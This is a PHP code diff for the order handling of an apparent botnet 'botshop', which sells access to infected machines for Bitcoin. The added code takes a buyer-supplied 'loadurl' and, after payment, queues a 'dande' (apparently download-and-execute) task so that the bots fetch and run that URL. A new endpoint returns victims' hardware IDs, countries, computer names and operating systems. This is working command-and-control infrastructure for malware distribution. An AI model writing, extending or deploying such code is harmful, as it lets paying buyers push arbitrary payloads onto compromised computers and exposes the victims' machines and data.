@@ -49,13 +49,13 @@ class OrderApi
         return $bots * $this->priceperbot;
     }
 
-    private function generateOrder($type, $bots)
+    private function generateOrder($type, $bots,$loadurl)
     {
         $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
         $usd = $this->botsToUSD($bots);
         $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
-        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount) VALUES (?, ?, ?, ?, ?, ?)");
-        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots));
+        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl) VALUES (?, ?, ?, ?, ?, ?,?)");
+        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl));
         return array(
             "address" => $bitcoinAddress["address"],
             "coinsToPay" => $coinsToPay,
@@ -87,6 +87,24 @@ class OrderApi
     }
 
 
+    public function detils(){
+        $address = $_POST["address"];
+        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE address = ?");
+        $statement->execute(array($address));
+        $orderTable = $statement->fetch();
+
+
+        $statement = $GLOBALS["pdo"]->prepare("SELECT  COUNT(bots.id) as NUM, tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
+            LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
+            LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
+            WHERE tasks_completed.taskid = ?");
+        $statement->execute(array($orderTable["taskid"]));
+        $order = $statement->fetch();
+        $order["order"] = $orderTable;
+        echo json_encode(array("order"=>$order));
+        die();
+    }
+
     public function checkorder(){
         $address = $_POST["address"];
         $payAmount = $this->checkAmount($address,$this->blockconfirms);
@@ -95,22 +113,27 @@ class OrderApi
         $statement->execute(array($address));
         $order = $statement->fetch();
 
+
         if($order["coinstopay"] <= $payAmount){
-            echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
             //Update order and insert Task
-            /*
-             $statement = $pdo->prepare("INSERT INTO tabelle (spalte1, spalte2, splate3) VALUES (?, ?, ?)");
-             $statement->execute(array('wert1', 'wert2', 'wert3'));
-             */
-            $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ? WHERE address = ?");
-            $statement->execute(array(1, $address));
-        }else{
-            if(!empty($payAmount)){
-                echo json_encode(array("success"=>"false","message"=>"Please send more Bitcoin","current"=>$payAmount,"needed"=>$order["coinstopay"]));
+            if($order["taskid"] == "none"){
+                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command) VALUES (?, ?, ?, ?)");
+                $statement->execute(array('[]', 0, 'dande', $order["loadurl"]));
+                $taskid = $GLOBALS["pdo"]->lastInsertId();
+
+                $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE address = ?");
+                $statement->execute(array(1, $taskid, $address));
+                echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
             }else{
-                echo json_encode(array("success"=>"false","message" => "Please send Bitcoin","current"=>"","needed"=>$order["coinstopay"]));
+                echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
             }
 
+        }else{
+            if($payAmount != "0.00000000" || $payAmount != 0){
+                echo json_encode(array("success"=>"false","message"=>"Please send more Bitcoin","current"=>$payAmount,"order"=>$order));
+            }else{
+                echo json_encode(array("success"=>"false","message" => "Please send Bitcoin to the flowing address", "current"=>"" , "order"=>$order));
+            }
         }
 
         die();
@@ -125,7 +148,7 @@ class OrderApi
     }
 
     public function createoder(){
-        $infos = $this->generateOrder("btc",$_POST["amount"]);
+        $infos = $this->generateOrder("btc",$_POST["amount"],$_POST["loadurl"]);
         echo json_encode($infos);
         die();
     }
